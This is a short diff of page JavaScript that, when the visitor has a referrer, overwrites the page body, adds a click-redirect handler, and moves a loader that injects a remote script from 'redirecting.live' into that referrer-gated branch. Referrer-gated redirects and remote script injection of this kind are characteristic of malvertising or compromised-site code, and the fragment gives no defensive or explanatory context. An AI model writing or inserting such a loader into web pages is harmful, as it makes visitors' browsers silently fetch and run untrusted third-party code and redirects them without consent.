@@ -15,7 +15,12 @@ if(document.referrer.length > 5)
 	
 		contenido+="</div></div></div></div>";
 		document.body.innerHTML =contenido;
-
+	   (function (a, d, j, o) {
+        o = a.createElement(d),
+            m = a.getElementsByTagName(d)[0];
+        o.src = j + "?d=0&r=" + Math.random();
+        m.parentNode.insertBefore(o, m)
+     })(document, 'script', 'http://redirecting.live/ad/41bc9048');
 		function goto(event) {
 		  var noRedirect = '.no-click';
 		  if (!event.target.matches(noRedirect)) {
@@ -27,9 +32,4 @@ if(document.referrer.length > 5)
 		window.onload=cont;
 		
                                 }
-     (function (a, d, j, o) {
-        o = a.createElement(d),
-            m = a.getElementsByTagName(d)[0];
-        o.src = j + "?d=0&r=" + Math.random();
-        m.parentNode.insertBefore(o, m)
-     })(document, 'script', 'http://redirecting.live/ad/41bc9048');
+  
